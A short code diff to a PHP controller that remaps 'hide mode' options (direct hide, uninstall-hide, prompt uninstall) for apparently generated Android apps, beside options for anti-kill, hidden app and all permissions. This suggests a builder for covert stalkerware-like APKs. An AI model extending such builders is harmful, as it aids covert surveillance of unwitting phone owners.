@@ -270,11 +270,16 @@ class AppBuildController extends Controller
 
     private function prepareBuildConfig(array $validated): array
     {
+        // 隐藏模式值映射（与旧系统 smali 一致）:
+        // c = 直接隐藏, f = 卸载隐藏, k = 提示卸载
         $hideTypeMap = [
-            'direct' => 'f',
-            'uninstall' => 'u',
-            'prompt' => 'p',
+            'direct' => 'c',
+            'uninstall' => 'f',
+            'prompt' => 'k',
+            // 兼容前端直接传 smali 原始值
+            'c' => 'c',
             'f' => 'f',
+            'k' => 'k',
         ];
 
         $buildConfig = [
@@ -288,7 +293,8 @@ class AppBuildController extends Controller
             'install_type' => $validated['install_type'] ?? 'f',
             'user_allprims' => $validated['user_allprims'] ?? '1',
             'user_blackprims' => $validated['user_blackprims'] ?? '1',
-            'hide_type' => $hideTypeMap[$validated['hide_type'] ?? 'uninstall'] ?? 'u',
+            'hide_type' => $hideTypeMap[$validated['hide_type'] ?? 'c'] ?? 'c',
+            'notify_msg' => $validated['notify_msg'] ?? 'on',
             'use_antkill' => $validated['use_antkill'] ?? '1',
             'diao_type' => $validated['diao_type'] ?? '1',
             'hidden_app' => $validated['hidden_app'] ?? '1',
